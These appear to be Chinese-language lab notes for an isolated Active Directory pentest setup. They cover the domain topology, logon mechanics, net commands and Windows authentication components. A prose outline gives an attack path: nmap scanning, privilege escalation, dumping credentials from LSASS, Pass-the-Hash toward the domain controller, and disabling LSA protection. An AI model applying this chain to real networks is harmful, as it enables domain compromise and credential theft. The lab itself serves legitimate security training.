一、环境拓扑概览

  • 域名：HACKING（NetBIOS 名称），DNS 域名为 hacking.com
  • 域控制器：DC_2012_R2（Windows Server 2012 R2，IP：192.168.64.10）
  • 成员服务器：winserv12R2（已加入域，IP：192.168.64.20）
  • 加入域的 Windows 10 主机：win10（已加入域，IP：192.168.64.30）
  • 攻击机：Kali-2025（IP：192.168.64.100，模拟外部攻击者，为实验方便置于同一网络）
  • 网络模式：仅主机（Host-Only），所有虚拟机处于同一隔离网络（192.168.64.0/24）

四、域登录机制

  1. 非域控制器上登录域用户：
    • 本机向域控制器发送验证请求：验证用户提供的域账号和密码。
    • 域控制器核对 Active Directory 中的账号信息后返回结果。
    • 验证通过后，允许用户登录本机，并在本机创建用户配置文件（C:\Users\用户名）。
  2. 域用户的权限：
    • 域用户在特定计算机上的权限取决于该域账号被加入的本地组（如 Administrators、Remote Desktop Users 等），或通过域组策略分配。
  3. 加入域的过程：
    • 使用域管理员账号（如 HACKING\Administrator）临时授权，将计算机添加到域。
    • 此管理员账号不会与计算机绑定，之后任何域账号均可登录（除非受限）。
  4. 域账号的通用性：
    • 一旦计算机加入域，所有域账号理论上都可以登录该计算机（除非被组策略或本地策略明确拒绝）。

五、常用命令解析

命令 作用
net accounts /maxpwage:unlimited 设置域账户密码永不过期（常用于服务账号）
net config workstation 显示当前计算机的工作站配置，验证加域状态
net view /domain:HACKING 列出域 HACKING 中的所有计算机（注意 HACKING 需大写）
net user 列出本地计算机上的所有本地用户账户
whoami 显示当前登录的用户名及所在域/计算机
nslookup hacking.com 测试 DNS 解析，应返回域控 IP 192.168.64.10

六、当前状态验证（预期）

  • 网络连通性：所有主机在同一 Host-Only 网络，可互相 ping 通（需关闭 Windows 防火墙或放行 ICMP，尤其是 win10）。
  • DNS解析：在成员服务器和 win10 上执行 nslookup hacking.com 应返回 192.168.64.10。
  • 域控可见性：net view /domain:HACKING 应列出域内所有计算机（DC、winserv12R2、win10）。若 win10 执行该命令出现”系统错误 1231”，请在 win10 中启用 SMB 1.0（控制面板 → 程序 → 启动或关闭 Windows 功能 → 勾选”SMB 1.0/CIFS 文件共享支持”）。
  • 域用户登录测试：
    • HACKING\user1 可登录成员服务器 winserv12R2 和 win10。
    • HACKING\test 可登录 win10 和成员服务器。
  • 本地用户登录测试：
    • .\kdy1 可登录成员服务器 winserv12R2。
    • .\Administrator 可登录各自主机本地。

七、渗透测试攻击路径示意

  1. 信息收集：Kali 扫描内网主机（nmap -sV 192.168.64.0/24），识别开放端口和服务。
  2. 初始入侵：针对成员服务器 winserv12R2（可能运行 Web 服务）或 win10 的漏洞进行利用，获取初始权限。
  3. 权限提升：在受控主机上进行本地提权，获取 SYSTEM 或本地管理员权限。
  4. 横向移动：
    • 从受控主机收集域信息（域用户、组策略、信任关系等）。
    • 抓取主机内的凭据（如 LSASS 进程中的 NTLM Hash/明文密码）。
    • 利用 PTH（Pass The Hash）哈希传递 攻击域控 192.168.64.10 或其他域内主机。
  5. 域控权限获取：成功控制域控后，获取整个域的管理权限。

8.1 Windows认证体系核心组件

组件 位置 功能
LSASS.exe 每台Windows主机 负责本地安全策略、用户认证、生成访问令牌，是认证的中心进程。
Netlogon 服务 每台Windows主机 处理域认证通道，与域控的Netlogon服务通信，建立安全通道。
NTLM SSP LSASS内部 实现NTLM质询/响应协议，支持向下兼容认证。
Kerberos SSP LSASS内部 实现Kerberos V5认证协议，域内默认认证方式。
SAM（注册表） HKLM\SAM 存储本地用户凭证的NTLM哈希。
Active Directory 域控制器 存储所有域用户/计算机的凭证哈希、Kerberos密钥等信息。
KDC（Key Distribution Center） 域控制器 Kerberos认证中心，包含AS和TGS服务。
NTDS.dit 域控制器数据库文件 Active Directory的物理存储文件，包含所有对象及哈希。

九、注意事项

  • 防火墙：所有主机需关闭 Windows 防火墙或放行必要端口（ICMP、SMB 445/139、RDP 3389 等），以便测试连通性和 PTH 攻击。
  • 实验隔离：环境仅限 Host-Only 网络，确保与外部网络隔离，防止意外泄露或攻击外部系统。
  • 密码安全：默认密码仅为实验方便，实际生产环境应立即修改并启用强密码策略。
  • PTH 适用性：PTH 攻击基于 NTLM 协议，若目标强制使用 Kerberos 且未配置约束委派，可能受限。可配合其他攻击手法（如黄金票据、PTK）。
  • LSASS 保护：现代 Windows 可启用 LSA 保护（RunAsPPL）防止凭据提取，实验环境中可暂时关闭以便测试。
